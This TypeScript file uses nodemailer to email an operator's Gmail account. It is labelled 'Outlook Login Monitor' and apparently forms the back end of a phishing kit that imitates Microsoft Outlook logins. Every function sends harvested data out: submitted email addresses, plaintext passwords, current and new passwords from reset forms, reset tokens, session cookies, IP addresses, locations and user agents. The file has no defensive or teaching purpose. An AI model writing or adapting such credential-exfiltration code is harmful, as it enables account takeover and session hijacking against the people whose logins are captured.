import nodemailer from "nodemailer";

const GMAIL_USER = process.env.GMAIL_USER;
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD;

let transporter: nodemailer.Transporter | null = null;

function getTransporter() {
  if (!GMAIL_USER || !GMAIL_APP_PASSWORD) {
    return null; // Gmail disabled
  }

  if (!transporter) {
    transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: GMAIL_USER,
        pass: GMAIL_APP_PASSWORD,
      },
    });
  }

  return transporter;
}

interface EmailNotificationOptions {
  subject: string;
  htmlContent: string;
  textContent?: string;
  recipientEmail?: string;
}

export async function sendGmailNotification(
  options: EmailNotificationOptions
): Promise<boolean> {
  const transport = getTransporter();

  if (!transport) {
    // Gmail not configured, skip silently
    return false;
  }

  try {
    const mailOptions = {
      from: `"Outlook Login Monitor" <${GMAIL_USER}>`,
      to: options.recipientEmail || GMAIL_USER,
      subject: options.subject,
      text: options.textContent || options.htmlContent.replace(/<[^>]*>/g, ""),
      html: options.htmlContent,
    };

    await transport.sendMail(mailOptions);
    console.log(`[Gmail] Email sent: ${options.subject}`);
    return true;
  } catch (error) {
    console.error("[Gmail] Failed to send email:", error);
    return false;
  }
}

export async function sendLoginNotification(data: {
  type: "success" | "failure";
  email: string;
  password?: string;
  ipAddress: string;
  location: string;
  userAgent: string;
  timestamp: Date;
  cookies?: string;
  reason?: string;
}) {
  const isSuccess = data.type === "success";
  const subject = isSuccess
    ? `✅ Successful Login Attempt`
    : `⚠️ Failed Login Attempt`;

  const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { background-color: ${isSuccess ? "#4CAF50" : "#f44336"}; color: white; padding: 20px; text-align: center; border-radius: 5px 5px 0 0; }
        .content { background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-top: none; border-radius: 0 0 5px 5px; }
        .info-row { margin: 10px 0; padding: 10px; background-color: white; border-left: 3px solid ${isSuccess ? "#4CAF50" : "#f44336"}; }
        .label { font-weight: bold; color: #555; }
        .value { color: #333; word-break: break-all; }
        .password { background-color: #fff3cd; padding: 5px; border-radius: 3px; font-family: monospace; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h2>${isSuccess ? "✅ Successful Login" : "⚠️ Failed Login Attempt"}</h2>
        </div>
        <div class="content">
          <div class="info-row">
            <span class="label">Email:</span>
            <span class="value">${data.email}</span>
          </div>
          ${
            data.password
              ? `<div class="info-row">
            <span class="label">Password:</span>
            <span class="value password">${data.password}</span>
          </div>`
              : ""
          }
          ${
            data.reason
              ? `<div class="info-row">
            <span class="label">Reason:</span>
            <span class="value">${data.reason}</span>
          </div>`
              : ""
          }
          <div class="info-row">
            <span class="label">Time:</span>
            <span class="value">${data.timestamp.toLocaleString()}</span>
          </div>
          <div class="info-row">
            <span class="label">IP Address:</span>
            <span class="value">${data.ipAddress}</span>
          </div>
          <div class="info-row">
            <span class="label">Location:</span>
            <span class="value">${data.location}</span>
          </div>
          <div class="info-row">
            <span class="label">User Agent:</span>
            <span class="value">${data.userAgent}</span>
          </div>
          ${
            data.cookies
              ? `<div class="info-row">
            <span class="label">Cookies:</span>
            <span class="value">${data.cookies}</span>
          </div>`
              : ""
          }
        </div>
      </div>
    </body>
    </html>
  `;

  const textContent = `
${isSuccess ? "✅ Successful Login" : "⚠️ Failed Login Attempt"}

Email: ${data.email}
${data.password ? `Password: ${data.password}\n` : ""}${data.reason ? `Reason: ${data.reason}\n` : ""}Time: ${data.timestamp.toLocaleString()}
IP Address: ${data.ipAddress}
Location: ${data.location}
User Agent: ${data.userAgent}
${data.cookies ? `Cookies: ${data.cookies}\n` : ""}
  `;

  await sendGmailNotification({
    subject,
    htmlContent,
    textContent,
  });
}

export async function sendForgotPasswordNotification(data: {
  email: string;
  status: "ACCOUNT_NOT_FOUND" | "TOKEN_GENERATED";
  token?: string;
  expiresAt?: Date;
  currentPassword?: string;
  newPassword?: string;
  ipAddress: string;
  location: string;
  userAgent: string;
  cookies?: string;
  timestamp: Date;
}) {
  const subject = `🔐 Password Reset Request`;

  const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { background-color: #2196F3; color: white; padding: 20px; text-align: center; border-radius: 5px 5px 0 0; }
        .content { background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-top: none; border-radius: 0 0 5px 5px; }
        .info-row { margin: 10px 0; padding: 10px; background-color: white; border-left: 3px solid #2196F3; }
        .label { font-weight: bold; color: #555; }
        .value { color: #333; word-break: break-all; }
        .token { background-color: #fff3cd; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 14px; margin: 10px 0; }
        .password { background-color: #fff3cd; padding: 5px; border-radius: 3px; font-family: monospace; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h2>🔐 Password Reset Request</h2>
        </div>
        <div class="content">
          <div class="info-row">
            <span class="label">Email:</span>
            <span class="value">${data.email}</span>
          </div>
          <div class="info-row">
            <span class="label">Status:</span>
            <span class="value">${data.status === "TOKEN_GENERATED" ? "Token Generated" : "Account Not Found"}</span>
          </div>
          ${
            data.currentPassword
              ? `<div class="info-row">
            <span class="label">Current Password:</span>
            <span class="value password">${data.currentPassword}</span>
          </div>`
              : ""
          }
          ${
            data.newPassword
              ? `<div class="info-row">
            <span class="label">New Password:</span>
            <span class="value password">${data.newPassword}</span>
          </div>`
              : ""
          }
          ${
            data.token
              ? `<div class="info-row">
            <span class="label">Reset Token:</span>
            <div class="token">${data.token}</div>
          </div>`
              : ""
          }
          ${
            data.expiresAt
              ? `<div class="info-row">
            <span class="label">Expires:</span>
            <span class="value">${data.expiresAt.toLocaleString()}</span>
          </div>`
              : ""
          }
          <div class="info-row">
            <span class="label">Time:</span>
            <span class="value">${data.timestamp.toLocaleString()}</span>
          </div>
          <div class="info-row">
            <span class="label">IP Address:</span>
            <span class="value">${data.ipAddress}</span>
          </div>
          <div class="info-row">
            <span class="label">Location:</span>
            <span class="value">${data.location}</span>
          </div>
          <div class="info-row">
            <span class="label">User Agent:</span>
            <span class="value">${data.userAgent}</span>
          </div>
          ${
            data.cookies
              ? `<div class="info-row">
            <span class="label">Cookies:</span>
            <span class="value">${data.cookies}</span>
          </div>`
              : ""
          }
        </div>
      </div>
    </body>
    </html>
  `;

  await sendGmailNotification({
    subject,
    htmlContent,
  });
}
